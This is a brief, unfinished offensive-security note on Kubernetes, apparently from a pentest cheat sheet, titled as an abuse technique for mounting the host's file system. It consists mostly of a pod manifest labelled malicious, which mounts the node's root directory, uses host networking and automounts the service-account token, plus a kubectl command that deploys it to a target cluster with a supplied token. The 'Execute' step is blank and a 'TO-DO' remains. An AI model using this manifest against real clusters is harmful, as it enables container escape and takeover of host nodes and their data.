Abuse #1: Mount host’s file system

1. Create a Malicious YAML (Template)

apiVersion: v1 
kind: Pod
metadata:
  name: alpine
  namespace: <NAMESPACE_NAME>
spec:
  containers:
  - name: test
    image: <IMAGE_NAME>
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

TO-DO

2. Create a new pod

kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> apply -f test.yaml

3. Execute
